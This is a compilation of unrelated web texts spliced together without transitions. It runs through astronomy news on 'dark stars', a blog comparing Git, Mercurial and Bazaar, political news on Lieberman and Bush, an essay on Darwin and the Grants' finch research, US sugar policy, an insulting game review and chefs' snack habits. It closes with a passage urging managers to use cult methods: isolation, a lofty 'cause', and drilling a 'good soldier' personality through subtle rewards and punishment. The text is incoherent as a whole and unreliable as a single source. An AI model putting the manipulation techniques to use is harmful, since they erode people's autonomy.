Astronomers can see that there were normal stars 700 million years after the Big Bang - the Hubble Telescope looking to the edges of the Universe , which is like looking back billions of years in time , can see whole galaxies of them .
JWST could see back to the first stars
The leading theory is that gravity pulled balls of dark matter and hydrogen together .
" These ' haloes ' , as we call them , are about a million times as massive as the Sun , and the first stars formed inside their centres , " Professor Freese told the BBC .
It had been thought the hydrogen brought together by these dark matter haloes would collapse to make the first small stars , and would start to make inside themselves the first new elements - carbon , oxygen , silicon and other materials needed by planets and life .
But the new paper says reactions between the Wimps , colliding and annihilating each other , would have generated enough heat to keep the protostars inflated - like hot air balloons .
And as more Wimps rained down on them the heating would have kept going .
These giant , diffuse stars could have filled the orbit of the Earth .
The details of what the stars would have looked like have yet to be worked out .
But in five years ' time , Nasa will be launching its James Webb Space Telescope ( JWST ) , the successor to the Hubble Space Telescope , and that might be able see right back to these " dark " stars .
There is also the intriguing possibility , says Professor Freese , that in some corner of our local Universe , there may be a few survivors lurking unnoticed .
Version control systems .
If you ’re a software developer , you ’re ( hopefully ) using one .
The most popular version control system ( VCS ) is no doubt Subversion .
It ’s what I currently use on every one of my projects , both personal and business .
While Subversion is a great improvement over previous VCSs I ’ve used ( CVS , RCS , SCCS , ClearCase and home grown ) , it ’s not without its warts .
And unless you ’ve been living under a rock , it ’s starting to get some serious competition .
I ’ve decided to play the field and see what this competition has to offer .
The Rise of Distributed Version Control Systems
Within the last year , distributed version control systems ( DVCSs ) have really started to break into mainstream development .
DVCSs are a different way of thinking about version control .
They break the mold of a single , central repository that most VCSs have , like Subversion and CVS .
A distributed VCS is different .
Each user checks out their own full copy of the repository and commit locally to it .
These changes may then be shared with others , often by syncing to a canonical repository .
I ’m not going to talk much about how DVCSs work or the benefits of a distributed VCS versus a central VCS .
That has already been much discussed elsewhere .
I highly recommend watching Linus Torvalds ’ YouTube video on Git and reading Wincent Colaiuta ’s piece called Why Distributed Version Control .
The Options
My own personal desire came when I was without Internet access for a few days ( shocking , I know ) , and realized that offline commits would be really useful .
Also , I ’ve many times thought it would be nice to be able to do local commits during a large feature .
DVCSs solve both of these issues cleanly and elegantly .
Commit to your local repository , and push out the changes when you have an Internet connection or when you ’re confident the feature is stable enough .
So now that I ’d bought into DVCS hype , I decided it was time to kick the tires and try them out .
As a new user , I ’ve found that choosing a DVCS is a bit overwhelming .
The number of DVCSs to choose from is staggering : Git , Mercurial , Bazaar , darcs , Monotone , Codeville , arch .
The big three I decided to look at are Git , Mercurial , and Bazaar .
After spending a day look these , I ’m still not fully decided , but here are my thoughts so far .
What ’s Wrong with Subversion
Before going into the details , let me first cover what I think is wrong with Subversion .
Subversion is a great step up from CVS , but here ’s what bothers me :
The whole trunk / tags / branches convention
No offline commits
. svn files everywhere
files everywhere svn:external is weak
I understand that copies are a cheap operation in Subversion , but that ’s an implementation detail .
Tags should be immutable .
No , I ’ve never accidentally checked out a branch and committed to one .
But still , if it ’s a convention and “ best practice ” to use trunk / tags / branches , Subversion should have the concept of a “ project ” built in .
If a theoretical svn tag is implemented as a copy under the hood , then so be it .
That ’s an implementation detail .
Instead of svn:external , I use Piston .
This makes it easy to lock an external to a tag , and then switch tags as you change versions .
It works pretty well , if not a bit slow .
You ’ll notice I do n’t even mention branching and merging .
I ’ve never used it , mainly because I have n’t felt the need .
Also , because it ’s hard .
Repeated merges from a branch are painful .
This is one area that Linus harps on .
He claims that maybe if Subversion branching and merging did n’t suck so much , people would actually use them .
Quite possible , but as of now , it ’s not something that bothers me .
Git
Git is the DVCS being used for Linux kernel development .
It was started by Linus himself after the whole BitKeeper Debacle of ‘ 05 .
While it started off as very user - unfriendly , and something only Linus could love , in the last year it has grown much better .
It has since gained a lot of traction and is arguably the most popular system .
The Mac blogosphere has been a buzz with developers switching or looking into Git over the last six months .
Wincent Colaiuta has been actively blogging about his use of Git since his switch to July .
Michael Tsai also switched to Git around July .
Fraser Speirs has a couple posts about being intrigued by Git ( 1 , 2 ) .
Bill Bumgarner claims
Git will eat Subversion ’s Lunch ( though he ’s really talking about DVCS eating Subversion ’s lunch ) .
Steve Dekorte switched to Git , after using darcs for a bit .
Drew McCormack started using
Git earlier this month .
I ’ve also seen quite a few Ruby on Rails blogs talk about using Git , as well , so to me it ’s the front - runner .
Here ’s my evaluation :
Pros :
Single top - level .git file
file Mature
Most common DVCS
Decent documentation
Used by a large project ( Linux kernel )
Easy to compile
Submodule support via git submodule
Can be shared read - only via static files over HTTP
Tracks content , not files
Cons :
Advanced branch features are not something I ’d really use
Spews 146 files into my PATH :
% ls /usr / local / bin/ git* | wc -l 146
Poor Windows support
Directories are not versionable
Submodule support feels awkward .
“ Deliberately ” minimal .
Ca n’t lock to a specific tag ?
Read - only static HTTP setup is a bit obtuse ( -- bare and update - server - info )
and )
Tracks content , not files ( yes , it ’s both a pro and a con )
The hundreds of files in PATH is more of an annoyance than a real criticism , and it ’s going to be fixed .
As of version 1.5.4 , the dashed form of commands ( e.g. git-commit ) is deprecated .
Version 1.6.0 plans on moving the dashed support files out of PATH .
The biggest weakness for me is the poor Windows support .
While I ’m not currently working on any Windows projects , I ’ve had client projects in the past that are either cross platform or use Windows as their development platform .
If I ’m going to be going through the trouble of learning a new version control system , it makes sense to learn something I can take with me on any project .
I ’m also unsure of “ tracks content , not files ” .
This means that Git can theoretically track a function moved from one file to another .
Wincent praises Linus as a “ frickin ’ genius ” because of this .
Most likely Wincent is correct , but my little mind has problems giving up on the versioning of files .
Mercurial
Git is n’t getting all the love .
Mercurial , sometimes known as “ hg ” ( as Hg is the chemical symbol for mercury ) , was also started due to the BitKeeper Debacle of ‘ 05 .
It has since been embraced by large projects like OpenSolaris , OpenJDK , NetBeans , and Mozilla .
Linus himself even praises Mercurial as the only other DVCS worthy as competition to Git .
Here ’s my evaluation :
Pros :
Single top - level .hg file
file Used by large projects ( OpenSolaris , OpenJDK , NetBeans , Mozilla )
Command usage is more similar to Subversion
Cross platform to Windows
Submodule support via the Forest extension
Simpler branch model ( a clone is a branch )
IDE integration with Eclipse and NetBeans
TortoiseHG in the works
Excellent documentation
Can be shared read - only via static files over HTTP
Cons :
The use of hgmerge seems a little wonky
seems a little wonky Still pre-1.0 ( currently 0.9.5 )
Forest extension is poorly documented
Static HTTP sharing is self - described as “ much slower , less reliable ”
Requires a CGI script for practical sharing over HTTP
Directories are not versionable
Tags are stored in .hgtags
The .hgtags file is a plain old text file that is versioned along with everything else .
Because it ’s not special in any way , it needs merging and can even get conflicts .
This is probably not an issue in practice ( sort of like Subversion ’s use of tags ) , but it still seems wonky .
The hgmerge script handles merges , and there ’s no standard way to say “ this is a binary file , do n’t merge it ” .
There ’s more on the Wiki about this .
Again , probably not a problem in practice , but it , too , seems wonky .
Probably the main weakness for me is that it ’s less common than Git .
I imagine Sun ’s new usage of Mercurial will be changing that .
Many in the Java community will probably follow .
Also , for some reason , Subversion developers do n’t hate Mercurial like they hate Git , either .
Perhaps that has more to do with Linus calling Subversion developers “ stupid ” and telling them they should be locked up in a mental institution than basis in fact , though .
Bazaar
Bazaar , sometimes known as bzr , is a DVCS used by Ubununtu and funded by the same company , Mark Shuttleworth ’s Canonical Ltd .
Pros :
Single top - level .bzr file
file Directories are versionable
Recently hit 1.0 ( December 14 , 2007 )
Excellent documentation
Fast ( bad performance during OpenSolaris investigation has supposedly been fixed )
Cross platform to Windows
Merge architecture seems more sane than Mercurial
Can be served up read - only by static HTTP
Simpler branch model ( a clone is a branch )
Cons :
No submodule support
Has been a minor pain to install on Mac OS X 10.5 and Centos 5.1
Not really used by large projects outside of Ubuntu
bzrweb is not as advanced as Git / Mercurial counterpart
Sharing over static HTTP is slow
A faster smart server is a major focus of the next version
Historically , the main complaint about Bazaar has been it ’s performance .
In fact , the main reason why OpenSolaris dismissed Bazaar was due to poor performance .
But that eval was a year ago , which is essentially an eternity .
Since then , Bazaar has hit 1.0 and those performance criticisms have supposedly been addressed .
Also , Bazaar has a history of changing the repository format .
Again , now that Bazaar has hit 1.0 , hopefully they wo n’t be doing this very often , any more .
The main weakness of Bazaar for me is that it ’s even less popular than Mercurial .
There ’s something to be said about using a tool that other people know , especially when the whole point of a DVCS is to get collaboration .
Then again , the directory support is intriguing , and I do like the ability to publish repositories using without a CGI script .
Also , as dbt said on Twitter :
[ T ]he general opinion I ’ve had is that bzr went for correctness before speed , while hg went the other way .
The Golden Age of Version Control Systems
Confused yet ?
I know I am .
There really is no run-away winner for me .
While I could probably use any one of these and be happier than using Subversion , I keep teetering between Git and Mercurial .
Which is more appealing , Git ’s content tracking or Mercurial ’s Windows support ?
Maybe I ’ll toss a coin .
Update : I ’ve chosen Mercurial .
If I were more patient , I ’d wait a year .
The year of 2007 is looking to be the beginning of the Golden Age of Version Control Systems .
The DVCs became more stable and got much better documentation .
Over the next year , I think we ’ll see a lot of activity in the VCS area .
If the progress of Git , Mercurial , and Bazaar in the last twelve months is any indication , they ’ll be even further ahead of Subversion in another twelve months .
Even the Subversion team is being forced to take notice , albeit a bit defensively at times .
Subversion 1.5 is going to bring better merge support .
Future versions may even have local commits and stop spewing .svn files everywhere .
Unfortunately , by the time Subversion gets these features , the DVCS guys will have had plenty of time to spit and polish their offerings , too .
All in all , this competition is good for you and me , the end users of VCSs .
I ’m really excited to see where the DVCSs are in another year .
In the meantime , I also want to be an early adopter .
Lieberman sad he can't vote in Connecticut Republican primary Michael Roston
Published : Monday February 4 , 2008
del.icio.us |
Print This Email This Senator Joe Lieberman , Connecticut 's ' independent Democrat , ' made political waves when he decided in December to officially endorse the presidential candidacy of Republican Senator John McCain .
Lieberman has actively campaigned for the senator , but has now gone a step farther and expressed his disappointment at being unable to cast a ballot for the Arizona Republican on Super Tuesday .
" I wont vote in the Democratic primary because I m supporting John , but I can't vote in the Republican primary , " Lieberman complained to Sasha Issenberg , a Boston Globe reporter , according to a Monday morning entry at the Political Intelligence blog .
The senator went on to describe himself as " blocked " and noted that he could not remember ever missing an opportunity to vote in an election .
While Lieberman caucuses with Democrats in the US Senate , he left the party in the summer of 2006 when challenger Ned Lamont defeated him in the state 's Democratic primary .
Lieberman won re-election under the banner of his own " Connecticut for Lieberman " party , receiving votes from many of the state 's Republicans .
Connecticut does not allow independent voters to participate in its primaries .
As a consequence , Lieberman cannot vote in the Republican primary for Senator McCain unless he officially switches his party affiliation .
Lieberman was former Vice President Al Gore 's running mate in 2000 , and ran for president himself in 2004 .
Lieberman 's decision to hit the campaign trail with Senator McCain marked a major reversal of his stated position on his post -2006 role in the Democratic Party .
In his 2006 campaign against Lamont , Lieberman called electing a Democratic president his priority .
" I want Democrats to be back in the majority in Washington and elect a Democratic president in 2008 , " Lieberman said in a debate with Lamont in July 2006 .
" This man and his supporters will frustrate and defeat our hopes of doing that . "
Lieberman endorsed McCain prior to the New Hampshire primary , where pundits suggested that his credentials as an " independent " might have been helpful as the Republican candidate worked to pick up votes from the state 's large bloc of unaffiliated voters .

Westminster Abbey is a Gothic and cavernous place of cloisters , chambers , nooks , and crannies that has served as Britain 's royal crowning place and national ossuary since the time of William the Conqueror , a thousand years ago .
Adjacent to the House of Commons in London , the abbey , now a UNESCO World Heritage Site , is filled with statues of generals , monuments to statesmen , poets , and martyrs , and the chest tombs of dead kings and queens .
There is also a humble white marble slab , on the floor of the north side of the nave , near the quire .
It 's easy to miss because it's in a kind of corner , where it 's dark , and it's also almost in the shadow of a garishly splendid monument to Sir Isaac Newton , which tends to hold the visitor 's attention .
But if you look for it , you 'll find it easily enough .
Charles Robert Darwin . Born 12 February 1809 .
Died 19 April 1882 .
No stirring elegy .
No moving psalm .
Just that .
I 'd gone to see that marble slab recently , partly because I just never had , and partly because it had been occurring to me for some while that of all the great thinkers among the Enlightenment 's first - born , from John Stuart Mill to Karl Marx , there was no one whose star still shines as bright in the firmament as Darwin's .
Of them all , Darwin remains indispensable .
But not , oddly enough , for his work as a scientist .
Darwin was a great scientist , of course .
He made important contributions to natural history , and even geology , but his most important contribution was not , strictly speaking , a scientific achievement .
It was a way of explaining the " mystery of mysteries " , the origin and diversity of the world 's living things .
But Darwin's
On the Origin of Species by Means of Natural Selection , or the Preservation of Favoured Races in the Struggle for Life presents not a single case of evolution by natural selection .
Instead , it was , in Darwin 's words , " one long argument " .
It was a theory with no hard science , no firsthand observation , to back it up .
It was a work of exposition and logic .
What Darwin had going for him , though , was a fine command of plain language and a body of evidence developed over more than two decades of investigation , observation , and reflection .
Darwin's quarry was the deeply entrenched conviction that each of the Earth 's myriad life forms was created by divine intervention only a few thousand years ago .
Darwin argued that the living things of the world had evolved from , at most , a handful of ancestors of almost unimaginable antiquity .
Darwin was n't alone in this heresy , but what distinguished his argument was the contention that evolution occurred by a process of minute variation in type and form , caused by natural factors that constantly " selected " those heritable traits in animals and plants that favour advantage and survival .
Evolution occurred at a glacial pace but it occurred nonetheless , and it was still going on , " daily and hourly " , in life all around us , Darwin insisted .
That was his resolution of the great mystery .
God , maybe , but not necessarily .
And , ultimately , it meant there was no reason to imagine that humanity was at the centre of any divine plan after all .
For the time , this was a very dangerous idea .
Darwin had gathered all manner of evidence from fossils , from pigeon breeders , and from his discoveries during his five - year tour as the naturalist aboard the survey ship HMS Beagle .
But because evolution occurred so slowly , his thinking went , it was n't possible to demonstrate its workings in case studies .
Darwin had his defenders and champions , and he also had in his corner the naturalist Alfred Russel Wallace , sometimes referred to as the " codiscoverer " of what came to be called Darwin 's theory .
But Wallace , too , despite years of fieldwork , relied on inference and logic to make his case , in the form of a table of " proved facts " and " necessary consequences " .
Although Darwin could show that evolution by natural selection must be the answer , he could n't present evidence for that answer in even a single case of evolution by natural selection , observed and documented in the " natural " world .
No one , least of all Darwin , had ever seen it actually happen .
As a consequence , long after Darwin 's theory had come to form the theoretical basis for the biological sciences , there was still an embarrassing dearth of experimental research into evolution .
It was still , outside of science , just an " opinion " .
While Darwin explained how the " natural " world worked in theory , no one , even into the 1970s , had been able to fully and methodically document and describe having actually seen it work that way in practice .
This is where Peter and Rosemary Grant come in .
Peter and Rosemary , both from England , met at the University of British Columbia in 1960 .
They soon married , and both went on to work as professors of evolutionary biology at Princeton University .
Now both 71 , the Grants are among the most successful and important collaborations in the history of science .
In 2005 they won the coveted Balzan Prize , which is equal in prestige to the Nobel Prize and brings almost three times the cash : the equivalent of about $ 3 million in Swiss francs .
The Grants have produced a body of research that is so exhaustive , so exacting and thorough , that many ornithologists fear it will never be replicated .
The object of the Grants ' obsessions is Galápagos finches .
These are the birds so closely associated with Darwin that they 're commonly called Darwin 's finches .
It was Darwin 's encounter with the archipelago 's 13 finch species in 1835 , during his five - week Galápagos sojourn as the naturalist aboard the Beagle , that caused his epiphany and produced evolution 's great eureka moment .
That 's the legend , anyway .
The truth is it was long after his return to England , and after the specimens he 'd collected had been properly classified by British taxonomists , that the significance of the birds , and of all those other peculiar endemic species he'd found on the Galápagos Islands , began to dawn on Darwin .
It was n't until Peter and Rosemary Grant began making their annual pilgrimages to the Galápagos island of Daphne Major , a forbidding place of black lava and hellish summers , that the finches began to fully reveal themselves to science .
The Grants began their fieldwork on Daphne Major in 1973 .
They 've put in 35 field seasons , and they 're still at it .
( The Grants will be presenting an overview of their most recent findings in a free lecture at the University of British Columbia on November 20 . )
The Grants have documented the phenomenon that Darwin could only surmise by deduction and conjecture .
It turns out that the mechanism of evolution can be observed moving through nature , not just in a laboratory or in a human - altered environment , and it does n't always move at a glacial pace .
The Grants have watched it happen , up close .
Biologists Rosemary and Peter Grant have spent 35 field seasons observing how natural selection has resulted in the evolution of Galápagos finches .
Biologists Rosemary and Peter Grant have spent 35 field seasons observing how natural selection has resulted in the evolution of Galápagos finches .
Specifically , what Peter and Rosemary have done is present the world with a rare and dramatic glimpse of variation caused by natural selection from one generation of animals to the next .
And down through several generations of Galápagos finches , from different species , they 've shown how heritable traits are " selected " so as to result in evolution .
As evolution occurs , even when it occurs quickly , it 's usually barely detectable .
The tiniest change can mean survival or extinction .
In the case of the Galápagos finches , what matters is often barely measurable changes in the size and shape of the finches ' beaks .
" That 's the really difficult thing to do , " Peter told me the other day .
" You do n't want to try it with earthworms . "
It is n't that Darwin 's theory had not been shown to work in practice before the Grants .
It 's just that no one had documented it in nature so completely and methodically .
Before the Grants , the case of the English peppered moth was one of the best - known studies of natural selection driving evolution .
But the story of the peppered moth unfolds in a completely human - altered environment .
Its observed evolution was in response to the rise and decline of the Industrial Revolution .
Prior to the advent of the " dark satanic mills " and the clouds of coal smoke and ash that settled over the English countryside , peppered moths were light - coloured , with specks and streaks of black , a colour scheme suited perfectly to camouflage because of the moths ' habit of alighting and resting on tree trunks , on similarly coloured lichens .
In the poisoned air of the Industrial Revolution , the lichens diminished in abundance and trees were commonly blackened with soot .
This trend favoured a black - coloured mutation in peppered moths and caused the light - coloured moths to nearly disappear .
In recent years , however , with the decline of both factories and coal power , the light - coloured moths have become dominant again .
Nowadays , evolution by natural selection is being observed in " the wild " among sticklebacks in British Columbia coastal lakes , among fruit flies in South America , and also in laboratories , on an hourly basis , around the world .
In his Pulitzer Prize–winning The Beak of the Finch : A Story of Evolution in Our Time , a 1994 book about the Grants and the significance of their work , author Jonathan Weiner sets out the paradox of the persistent hostility to Darwin's " theory " .
Evolution denial is a common habit of some of Darwin 's most privileged beneficiaries in the United States , almost always evangelical Protestants , whose wealth often depends solely upon Darwin being right .
The paradox occurs in an especially bizarre way in the American South , in the " cotton belt " , where the health of the cotton crop and the wealth that derives from it depend completely upon the application of Darwinian principles in the laboratory .
It is only by the close observation of evolution by natural selection occurring in various cotton blights and pests that science has managed to devise at least temporarily effective pesticides and herbicides .
The paradox deepens in the recurring failure of those blight and pest remedies .
There are now moths in Louisiana that can ruin cotton crops , and they 're now 200 times more resistant to pesticides than they were before they first encountered them .
Reject Darwin and you 'll never understand why that happens .
You 'll continue to employ pesticides , and you 'll find yourself in a losing battle , precisely because evolution happens .
It happens by natural selection .
Resistant strains emerge by natural selection for certain heritable traits .
Life is not static .
Species are not fixed and unchanging .
They evolve , and if Darwin were wrong , the branches of science known as immunology , bacteriology , and virology would never produce any results .
It would all be quack science .
" There is no new theoretical structure that has come along since Darwin , " Grant told me .
" His ideas have been extended through genetics and have been modified and elaborated upon , but his ideas and observations and explanations have withstood the test of time . "
And so Darwin prevails .
Evolution is driven by hybridization and by sex selection , but the main engine is natural selection .
It is how the earth ended up so rich in the diversity and abundance of life .
It is evidence against the founding texts of all the world 's great religions .
It is evidence for life as a phenomenon that is constantly changing , constantly innovating , all on its own .
It is a rational explanation , subject to testable hypotheses .
It is free for the asking and available to everyone , regardless of culture or class .
It can account for everything from the virulence of diseases to the complexity of the human eye to the origin of humankind itself .
No stirring elegy .
No moving psalm .
Darwin prevails , more than anyone else .
Charles Robert Darwin . Born 12 February 1809 .
Died 19 April 1882 .
UBC 's Beaty Biodiversity Museum will host Peter and Rosemary Grant , who will present their lecture Evolution of Darwin 's Finches at 7:30 p.m. on Tuesday ( November 20 ) in Room 100 of the Wesbrook Building ( 6174 University Boulevard ) .
Admission is free .

Components of the Sugar Program
The purpose of U.S. sugar policies is to keep domestic prices artificially high .
In recent decades , U.S. sugar prices have been typically two or more times higher than prices on world markets .
2
The federal government achieves that result by setting guaranteed prices and backing them up with trade restrictions and production quotas .
Guaranteed Prices .
The U.S. Department of Agriculture runs a complex loan program to support sugar prices .
The USDA makes loans to sugar processors , who use their sugar as collateral .
In return , processors agree to pay sugar growers certain minimum prices .
If the market price of sugar rises , processors can sell their product on the market and pay back the loan .
If the market price falls , processors can forfeit their sugar to the government and not repay their loans .
The effect is to guarantee prices for both processors and growers .
Sometimes other techniques are used to prop up prices , such as paying producers to discard their current inventories .
Trade Restrictions .
Import barriers help to maintain high domestic sugar prices .
The government applies a two - tiered system of “ tariff rate quotas ” to limit imports .
A lower “ in- quota ” tariff rate is for imports within a set quota volume .
A higher “ over - quota ” rate applies to imports in excess of the quota .
The in -quota amounts are allocated to 40 foreign countries on the basis of prior import patterns .
These restrictions prevent lower - cost foreign sugar from putting downward pressure on U.S. prices .
Sugar imports are currently restricted to about 15 percent of the U.S. market .
By contrast , imports typically accounted for about half of the U.S. market prior to the 1980s.
3
Production Quotas .
In addition to controlling sugar imports , the government imposes quotas , or “ marketing allotments , ” on U.S. production .
Each year , the USDA decides what total U.S. sugar production ought to be and then allots it 54.35 percent to beet sugar and 45.65 percent to cane sugar .
Most sugar beet production is in Minnesota , Idaho , North Dakota , Michigan , and California .
Most sugarcane production is in Florida and Louisiana .
The USDA allots each U.S. state and each sugar company a specific quota based on a complicated formula .
In sum , the sugar industry is a cartel that is centrally planned from Washington .
Since the time of the founding of our great country , the government has taken every opportunity to insinuate itself into every conceivable manner of non-government business .
Take for example the sugar industry .
Chris Edwards over at Cato discusses the problems created by government meddling in the sugar industry in the latest Tax & Budget Bulletin ( PDF ) .
This is exactly why we , in the country in which it was invented , have to have inferior Coke produced with corn syrup ( which the government is also heavily involved in ) rather than the good stuff made with real sugar .
I rarely drink Coke when I am here in the States , but make a point of drinking it when I am in China .

Absolutely the best game I 've played in years .
And I have a large disposable income and know better than you , asswipe .
You can read the circular 2D hack 'n ' slash button mash RPG details at some other site that , you know , sells ad positions , but what this game really comes down to is a series of elegant balances , delicate combat dances , and the frequent frustration that nicked paint on walls around anyone with an NES who ever gave a fuck .

You 've got your typical Double Dragon dilemma of three swings or four before getting hit back .
You 've got the classic blinking knocked - down get up free hits as well , but press X once more and you 're too tuckered to duck the knockout blow .
Stack your stats and potion stock enough to take some punishment , but you 'll have to eat a " C " for the stage and , pride aside , probably wo n't get more potion materials to replace the bunch you just wasted on a glucose drip .
But at least you 'll finally have some room in your saddle bags for more items , cause more bags cost more money and you could be spending that on stats .
But without more bags you 'll have to eat the fruit you grow with phozons you could have used to learn more spells instead of bringing that fruit back to better juke your stats by cooking - a process which requires the money you just spent buying bags .
Separating each stage into single battles lets you pick it up and put it down as you please , and prevents burnout from repetitive losses since " just once more " always only takes 1 to 3 minutes .
And - write this down you EA - playing cinematically - driven passive -( aggressive ) - entertainment code monkeys - losing so much is what makes it so satisfying when you win .
It also helps to have a carefully translated story which intricately intertwines five different characters who are all fun to play and eat everything in sight .
pretty pretty princess chases down sheep , beats senseless and eats .
The most common obligatory reviewer 's knock I 've read has been slowdown and constant load times but , look people , every other weekend I 'm on my hands and knees in Gamestop like a base head who thinks they lost a rock in the carpet , crawling through the bottom shelf for just one more title to keep me from having to shut down and say goodbye to the finest console ever made .
So shut up and use that time to drink .
All I know is I faced 56 hours of merciless ridicule for playing what my housemate dubbed " the fairy dress - up game " and do n't want a single one back .
The reassuring talk and emphasis on bipartisanship are smart politics , said Kenneth M. Duberstein , a former chief of staff to President Ronald Reagan who is widely credited with helping to turn around Mr. Reagan ’s second term .
Mr. Duberstein said Iraq and the economy had been the twin pillars of Mr. Bush ’s presidency .
“ In the final analysis , ” he said , “ people vote for their wallet  what ’s in it , and what ’s not in it  more so than Iraq or anything in foreign policy . ”
Polls show that the public feels unsettled about the future .
The percentage of Americans who believe the country is on the wrong track now stands at 75 percent , while just 19 percent believe it is on the right track , according to a New York Times / CBS News poll this month .
Democrats intend to capitalize on those numbers in the fall campaigns ; despite joining hands with Mr. Bush on the stimulus package , they are already hammering him on the economy .
Representative Rahm Emanuel of Illinois , the chairman of the House Democratic Caucus , has been warning for months of a looming “ Bush recession . ”
The day before the stimulus deal was reached , Mr. Emanuel released a chart titled “ The Legacy of George W. Bush ’s Presidency , ” which contrasted a litany of economic indicators , like the price of gasoline and median household income , from 2001 to today .
None favored Mr. Bush .
From a strictly economic perspective , it is difficult to blame Mr. Bush for the current crisis .
Even some economists who have been critical of the president , like Bruce Bartlett , who worked in the Reagan and first Bush administrations , say he cannot be held liable for the burst of the housing bubble or problems in credit markets .
But from a political perspective , it is hard for Mr. Bush to escape .
The economic expansion that came after his tax cuts has largely benefited the wealthy , which is why it is easy for Democrats like Mr. Emanuel to make the case that Mr. Bush ’s stewardship of the economy has created “ a middle - class squeeze . ”
And if the president ends his term in a recession , it will be difficult for him to point to any real economic progress on his watch .
Mr. Bush counters that the fundamentals of the economy are strong , even as it appears to be unraveling .
He is careful to avoid the word “ recession , ” preferring to talk instead about “ economic challenges ” and “ uncertainties , ” as he did on Friday at the Republican retreat .
“ We have a flexible , we have a resilient and we have a dynamic economy , ” Mr. Bush said .
“ But there are some uncertainties . ”

Chefs are just terrible for picking at things and I 've learnt that if I 've got , say , pork pies in the fridge they 'll go - so I try to have a couple of things in to pick on like hummus and pitta breads , brazil nuts and roasted cashews and dried fruit .
To make a quick cheat 's hummus , drain a tin of chickpeas , keeping a bit of the liquid , and blend with crushed garlic , olive oil , - and just a little bit of mayonnaise .
It gives a lovely texture .
I also like quick pasta salads .
We might occasionally buy them , but I 've got kids so they like to make up a little pasta salad .
And we always have salad in the fridge , which is easy to make when you 're tired .
I also eat fruit - at the moment bananas , apples , some great plums and pears are coming into season .
I do try to pick on stuff that 's healthy - we do n't have any chocolate in the house , and biscuits are limited because , like anyone , I 'll go for them .
Alexis Gauthier , Roussillon , Pimlico
I do n't eat when I go home - like many chefs , I eat throughout service by tasting the food we are serving .
I never eat unless I am hovering over a saucepan - a little bit here , a little bit there - so when I go home the last thing I feel like doing is eating .
I only eat a proper meal at weekends .
I cook anything seasonal then , but mostly vegetables .
This weekend I cooked ratatouille and I ate it on its own with grilled pain Poilâne .
It 's not to everybody 's taste but I find it delicious .
I never eat puddings because I eat too many during the week - I may look like a stick but all this tasting wreaks havoc with your figure .
It 's all hidden under my chef 's whites but I run a lot so that helps keep me reasonably sane and fit .
Sally Clarke , Clarke 's Restaurant , Kensington
Eating on the run for me usually means seasonal fruit .
When you can get them , figs are lovely - I slice them on to a plate , and drizzle with great olive oil , add Maldon salt and pepper , and scatter with " Sally 's Pick ' n ' Mix " ( dried fruits and nuts mix ) .
Then I just add salad leaves on top with some parmesan shavings .
It sounds complicated , but it 's really easy to throw together .

When I get back from work , I just fall flat into bed - I do n't eat anything .
I do n't get home until after one in the morning and I hate eating late at night because it stops me from sleeping .
I usually have something light to eat in the afternoon - some pasta or maybe a bowl of soup or a prosciutto sandwich .
Yesterday I had a delicious roasted slip sole cooked in the wood oven .
I tend to eat light food because I do n't have the time to do anything too complicated and rich food just does n't agree with me - I hate foie gras for example .
I always have a big breakfast - yoghurt , muesli , a large bowl of fruit .
We eat with the kids before I take them to school .
It sounds idyllic , all sitting down to a family breakfast but it 's the only time I see them .
Matt Foxon , The Rosendale , West Dulwich
After a long day in the kitchen I go for fried eggs on toast : it 's a classic snack that 's easy to put together .
I always use wholemeal bread which is usually better fresh from a bakery .
I cut two thick slices and toast them lightly , then fry a large , free - range organic egg in generous amounts of salted butter .
Finally I add some crushed sea salt and a little Tabasco sauce .

I like to spend my days off practising cooking so I make whatever the missus fancies eating , then live off what 's left over for the rest of the week .
But if she 's not around , or I do n't have time to cook , then I tend to exist on beer and nachos .
If you spend the whole day running around at 100 miles an hour then your brain has to go at the same pace to keep up .
At the end of the day I find that a cold beer , some nachos and metal music calms me down .
I also make a cracking pizza - sometimes I make five , stick them in the fridge and eat them cold ( with a Corona of course ) when I get home .
Last week was manic in the restaurant and when I got home on Sunday night I cooked some rice , blanched some seaweed and whatever veg were left in the fridge and cooked it up with tuna stock and soy sauce .
Paul Kitching , Juniper , Altrincham
I 'm not a big eater at the end of work - I like to have a drink , but my other chefs who are a bit younger than me tend to rely on food a lot more .
They go for kebabs after work - which is n't my sort of thing , but there 's a kebab shop that 's open till 4 am down the road from Juniper , which is great for when we finish at two or three in the morning .
There 's a mutual respect between the guys in the kebab shop and Juniper - we always get the fresh iceberg and the fresh chillis .

If I need to cook a 15 - minute meal at home , my favourite meal is spaghetti with chorizo and prawns .
Once you 've got your spaghetti on , add butter and oil to a large non -stick saucepan over a medium - high heat , and saute some diced chorizo for one minute .
Then add half a yellow onion , and saute for another minute , before adding 75g of cleaned black tiger prawns , 50g of sun-blushed tomatoes and a long , red chilli and cooking for another two minutes .
By this point , the spaghetti should be ready .
Drain it , and toss the spaghetti into a large bowl .
Pour the contents of the saucepan over the bowl , add the basil , and drizzle with lime juice .
If you 're really pushed for time , you can put the oil , butter , basil and chilli in a blender and use that as the base .
I normally make always a bit more from it and use it for garlic bread ·
Cults may do this in the most dramatic way with an end result that even Jack 's family members agree " This is n't the Jack I know . "
The methods that cults use can be used by anyone in any group setting and can be thought of as a " Management system " or a technique of motivation .
Thus there is a benefit to applying this knowledge in other areas .
ISOLATION
An obvious way a cult does this is through isolation from other social networks .
The extreme of a cult does not have to be applied .
If this is applied to a work setting then the stated rule is " This is work .
Leave the other parts of life at the door . "
Likewise the person can go home and leave work at work .
The result is a " work personality " and a " home personality " .
ENLIST THEM IN A CAUSE
Nothing is quite so motivating than to be involved in a glorious cause .
To do this make the success of the group linked to the individuals success .
Make the cause lofty and ideal and progressive always on the wave of the future .
DESCRIBE FOR THEM THE QUALITIES OF A " GOOD SOLDIER "
Once you 've enlisted them in a cause you can now tell them how best to serve the cause .
By describing the qualities of " good soldier " you create an ideal of behavior .
On the one hand it 's important to point out qualities that they already have to affirm their part in the cause .
But it 's also important to describe qualities that they will have to work to develop .
These qualities can be actual behaviors or they can values that you wish to impose on them .
Either way you are holding them to an ideal and letting them know that they play a vital role in the cause .
DRILL THE " GOOD SOLDIER " INTO EXISTENCE
A cult may do this process with intense drills and exercises that emphasize the qualities and values of a good soldier .
They will create scenarios and situations where these qualities can be tested and followed up with feedback and correction when needed .
You can do this in a management setting much the same way .
The goal is to make them WANT to bring on this new personality and do it without prompting .
This is done mostly by creating a high standard and through a subtle application of rewards and punishment .
Nothing will solidify the new personality than getting a group of " good soldiers " together and having them work with some great purpose in mind .
